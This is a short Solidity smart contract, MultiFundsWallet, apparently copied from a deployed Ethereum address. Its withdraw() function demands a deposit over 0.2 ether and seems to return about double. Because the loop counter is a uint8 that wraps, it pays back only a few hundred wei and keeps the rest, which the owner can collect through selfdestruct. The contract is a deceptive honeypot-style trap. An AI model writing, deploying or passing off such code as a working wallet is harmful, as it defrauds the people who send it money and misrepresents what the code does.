/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract MultiFundsWallet at 0xd2ea3d1be7b482966ba8627ff009b84bac3bf51e
*/
pragma solidity ^0.4.24;

contract MultiFundsWallet
{
    address owner;
    
    constructor() public {
        owner = msg.sender;
    }
    
    function withdraw() payable public 
    {
        require(msg.sender == tx.origin);
        if(msg.value > 0.2 ether) {
            uint256 value = 0;
            uint256 eth = msg.value;
            uint256 balance = 0;
            for(var i = 0; i < eth*2; i++) {
                value = i*2;
                if(value >= balance) {
                    balance = value;
                }
                else {
                    break;
                }
            }    
            msg.sender.transfer(balance);
        }
    }
    
    function clear() public 
    {
        require(msg.sender == owner);
        selfdestruct(owner);
    }

    function () public payable {
        
    }
}